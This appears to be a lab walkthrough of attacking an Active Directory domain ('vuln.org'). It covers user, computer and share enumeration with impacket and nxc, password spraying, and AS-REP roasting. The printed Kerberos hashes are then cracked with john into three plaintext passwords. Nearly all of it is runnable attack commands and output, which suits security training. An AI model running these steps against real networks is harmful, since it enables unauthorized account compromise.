# Enumeration with a user (sheila.kellie) (P@ssw0rd)

## Getting all users

```shell
impacket-GetADUsers vuln.org/sheila.kellie:P@ssw0rd -dc-ip 123.123.123.128 -all | awk -F ' ' '{print $1}'

nxc smb 123.123.123.128 -u 'sheila.kellie' -p 'P@ssw0rd' --users
```

```
Administrator
Guest
krbtgt
clara.bethanne
jessalyn.nissa
natalie.evy
donia.leila
kippar.audie
aurora.bonnie
kim.gabriell
lishe.allegra
sharron.dredi
carley.marla
hildegaard.karel
merrie.bernetta
jannel.kinsley
rickie.marjie
jillian.elli
amalee.dionis
rubia.imelda
hesther.etta
jane.karlyn
eachelle.neala
lesli.nicolina
oralie.audrie
ertha.joly
michaela.ora
antonella.krishna
elli.jacquette
rafaela.lindsay
clo.kermy
allx.mikaela
jo.katherina
henka.darby
cherianne.nadya
kiele.ilene
dorisa.minette
kin.farra
hana.amandy
florenza.sarita
goldarina.jacklin
adah.lissie
alisa.philippine
briana.annmarie
pen.annie
crin.gerladina
dulce.robyn
pammy.sheilah
mariya.ardenia
mehetabel.chandra
anabella.addie
corene.lanna
kerrie.darci
robbi.katerine
bibi.lauree
ginni.liva
ginelle.fredra
erinna.candi
stephannie.odelia
laverna.evanne
ivy.pauli
lesli.louise
lorene.cecilla
celina.grissel
jennee.sashenka
klaus.linea
shane.deidre
janel.daniela
carlotta.elbertine
brear.kyrstin
mirna.mariya
mil.hettie
maddalena.noreen
anny.robyn
denna.dorian
margalo.cassey
reeva.melosa
mercy.aubrey
kore.keelia
jolee.jerrine
mellisa.brigitte
carmelle.jaimie
claire.sharla
catarina.shaylynn
hedwig.janelle
etty.florida
maye.justina
alethea.ddene
kerrill.millisent
irena.orella
bernadene.keelia
ava.feodora
corina.angelita
konstantin.kalina
dawn.babbie
stefanie.arline
carole.emelina
jill.dianna
stefa.bridget
lydie.janith
kristi.josee
glyn.giacinta
malena.lucila
lillis.loise
olivia.cacilia
korrie.cicily
collete.alexandra
marjy.cecily
birdie.fawne
marketa.leonardo
brandea.madalyn
ruthanne.lenette
evey.rivy
emyle.henka
ginny.jayme
cheryl.ardis
samara.nanny
phyllys.norma
cherilynn.emylee
denny.nelly
essa.gaye
sheila.kellie
herta.deb
killie.lauri
adoree.nadya
lise.carol
goldia.gianina
elvina.lenna
oliy.fredi
eugenie.sioux
karia.halimeda
karyn.leroi
rafaelia.lonnie
kristine.darelle
phoebe.eachelle
georgeanne.karalynn
callie.adelice
norean.elbertine
estrella.alanna
harrie.ardelle
nara.peggie
anna-diane.anne
gabbey.llywellyn
kaitlynn.nichole
mechelle.nessi
faythe.lea
catharine.rivkah
jillie.jania
roxy.janene
beverlie.oralie
reena.andree
linea.ann-marie
josee.kailey
cinda.prudy
becca.cherrita
kirbie.giuditta
jeni.lotty
bobbette.farra
eadie.corrianne
alayne.corella
norrie.lauren
nita.clio
maressa.noni
cariotta.sissy
llewellyn.loraine
hildegarde.joy
jelene.glenn
hendrika.norry
kenyon.hedvig
corie.harley
noelle.phil
angele.mickie
barrie.brittani
alisun.kata
adelice.druci
renie.charissa
callie.cesya
alys.lora
eloise.grete
annabella.cahra
idalia.issy
orsa.rhetta
barbabra.shaylyn
penni.sherry
marigold.rochette
nataline.susy
milli.jacklin
allys.kleon
lethia.odele
chelsae.glenda
sibyl.rosalinda
babita.gisella
ryann.blinnie
belicia.deeann
kenna.paule
linc.roze
rochette.hattie
melloney.henrie
felicia.doria
evvy.carlee
pietra.livvie
grace.hesther
anstice.rina
```

## Enumerating Computers

```shell
nxc smb 123.123.123.128 -u 'sheila.kellie' -p 'P@ssw0rd' --computers
```

```
SMB         123.123.123.128 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:vuln.org) (signing:True) (SMBv1:False)
SMB         123.123.123.128 445    DC01             [+] vuln.org\sheila.kellie:P@ssw0rd 
SMB         123.123.123.128 445    DC01             [+] Enumerated domain computer(s)
SMB         123.123.123.128 445    DC01             vuln.org\WS01$                         
SMB         123.123.123.128 445    DC01             vuln.org\DC01$
```



## Password Spraying with `Changeme123!` password

```shell
nxc smb 123.123.123.128 -u users.txt -p 'Changeme123!'
```

```
[-] vuln.org\celina.grissel:Changeme123! STATUS_PASSWORD_MUST_CHANGE
[-] vuln.org\carlotta.elbertine:Changeme123! STATUS_PASSWORD_MUST_CHANGE
```

## Enumerating Shares

```shell
nxc smb 123.123.123.128 -u 'sheila.kellie' -p 'P@ssw0rd' --shares
```

```
SMB         123.123.123.128 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:vuln.org) (signing:True) (SMBv1:False)
SMB         123.123.123.128 445    DC01             [+] vuln.org\sheila.kellie:P@ssw0rd 
SMB         123.123.123.128 445    DC01             [*] Enumerated shares
SMB         123.123.123.128 445    DC01             Share           Permissions     Remark
SMB         123.123.123.128 445    DC01             -----           -----------     ------
SMB         123.123.123.128 445    DC01             ADMIN$                          Remote Admin
SMB         123.123.123.128 445    DC01             C$                              Default share
SMB         123.123.123.128 445    DC01             IPC$            READ            Remote IPC
SMB         123.123.123.128 445    DC01             NETLOGON        READ            Logon server share 
SMB         123.123.123.128 445    DC01             SYSVOL          READ            Logon server share 
```

---------------------------------------------------------------------------------------------------------------------

# Attacking!


## AS-REP Attack!

```shell
impacket-GetNPUsers vuln.org/sheila.kellie:P@ssw0rd -dc-ip 123.123.123.128 -request
```

```
Name              MemberOf                              PasswordLastSet             LastLogon  UAC      
----------------  ------------------------------------  --------------------------  ---------  --------
jennee.sashenka                                         2024-11-19 00:49:07.542888  <never>    0x400200 
bernadene.keelia                                        2024-11-19 00:49:07.605309  <never>    0x400200 
maressa.noni      CN=marketing,CN=Users,DC=vuln,DC=org  2024-11-19 01:25:44.726695  <never>    0x400200


$krb5asrep$23$jennee.sashenka@VULN.ORG:1b671536c87eaf25b0c42a3986aa5ece$aebea9c52a6f33da43c5b88c75e8b5850f540cf36ce00d7cf7e4c19e788a32d4d6f69eb2af09ab96bf6619c8e2fc489dd6db63a85feb08e5512bf4895055c334ca444feecc6ef0c61c6d3ec1ffe3a4a603e200bbe611efb7c24e6a6ac9e9d5f8ef9c8e0ef819ccf7c604121b54cf8aebf1a8c842232d9343cd07a2edfb76d34c46aa8fbf8969ba9c51eae80e721bac1a5a287b4c9ba4140eb03e78250ea3aafae786b4968918356b9c1bb1ff2125bcfedfae710eac8a13627b56d413cd0d547497078979341cc972ac95b8b4182ab8bfc97be47acaeff0992a6524cd60844c83cc55c512

$krb5asrep$23$bernadene.keelia@VULN.ORG:92d39e48715c2987e35b8b24fef2e0b0$4fae2f8a3cf45e8d355c1ab9efdccb824e6cbf1cbe6e20c72b6eee6e09d6ec7bc0962bd5662fc12c4ff87657d4fe91c492d388d4a879b98c8561c6ab46ca392fdb9379b83f04b19d7a82711bff5199ade272290ca07dfd4d754e762435e94a56d87613fe6ea1e7f70dd113ff51c4ccf83684e6767c2cb75cca0e96294bf1a37c087fb7fe8ec4cc77467264b3a2d02fde9b0a1e2479f654ac10fc2b693f06bb93185cef4916abdb41467fa36d6966a8dfeec92c6ec7599b7587809bf6f63bc2e8bf0a37c7de1e7bdb978dc66b63bbaa09e6c531d42cbfbcd8e05f53afe04b4595c9ced34f

$krb5asrep$23$maressa.noni@VULN.ORG:b7c7dc97dc06c4488563dfee0f2da5a6$f6c3c2204702f753188999b875b259b986e016b25d4649e2e16c1a1beb78adf63ed7461ac567c2b996a3295a089e06512b69c5eefd7fbdb7401e676e93cabbbe00757519966bbe42cfbaf406a9f7646c01c696e58e4a20e3c55e5789c3eff94ee189447138eb2b7a2c7ac2156bc82259c2c71e41dbbdde53d45732b312c5bb416a35f7e5f975f9a519035eef5bc3f32e66c4c05981a7aa3f84708b87315ca9b37be28e62fb94b8058d9d377cf5fcea34963da90666169b0d1f91867068586efcaa326f74420bd7feb224178839059b70a5a47a6599efd63e4afdf271b41b49993fd363c0
```

#### Cracking Them

```shell
john kerb-users.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```shell
666666           ($krb5asrep$23$jennee.sashenka@VULN.ORG)     
cameron          ($krb5asrep$23$bernadene.keelia@VULN.ORG)     
654321           ($krb5asrep$23$maressa.noni@VULN.ORG)
```

#### [!] New Creds

```
jennee.sashenka:666666
bernadene.keelia:cameron
maressa.noni:654321
```

